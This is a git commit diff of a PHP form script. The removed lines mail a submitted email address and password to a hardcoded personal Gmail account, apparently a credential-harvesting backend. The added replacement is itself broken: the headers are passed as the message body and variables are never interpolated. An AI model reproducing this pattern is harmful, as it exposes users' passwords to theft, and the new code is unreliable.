dd4653520c58c1c1fd4ffa170bdf9f2a664d6477
Breno Lins <36646169+BrenoLins100@users.noreply.github.com>
2020-11-12 17:11:37 -0300

    Update email.php

--- Form/email.php
+++ Form/email.php
@@ -4,21 +4,25 @@ $email = $_POST['email'];
 $senha = $_POST['senha'];
 $mensagem = "Olá";
 
-//var_dump($email,$senha);
+//enviar
 
-$to = "brenolins100@gmail.com";
-$subject = "Contato - Breno";
-$body = "Email: ".$email. "\r\n".
-        "Senha: ".$senha. "\r\n".
-        "Mensagem: ".$mensagem;
-$header = "From:pinguin123a@gmail.com".
-    "Reply-To:".$email. "\e\n".
-    "X=Mailer:PHP/".phpversion();
+  // emails para quem será enviado o formulário
+  $emailenviar = "brenolins100@gmail.com";
+  $destino = $emailenviar;
+  $assunto = "Contato pelo Site";
 
-    if(mail($to,$subject,$body,$header)){
-        echo "Email enviado com sucesso";
-    }else{
-        echo "Erro ao enviar email";
-    }
+  // É necessário indicar que o formato do e-mail é html
+  $headers  = 'MIME-Version: 1.0' . "\r\n";
+      $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+      $headers .= 'From: $nome <$email>';
+  //$headers .= "Bcc: $EmailPadrao\r\n";
 
+  $enviaremail = mail($destino, $assunto,$headers);
+  if($enviaremail){
+  $mgm = "E-MAIL ENVIADO COM SUCESSO! <br> O link será enviado para o e-mail fornecido no formulário";
+  echo " <meta http-equiv='refresh' content='10;URL=contato.php'>";
+  } else {
+  $mgm = "ERRO AO ENVIAR E-MAIL!";
+  echo "";
+  }
 ?>
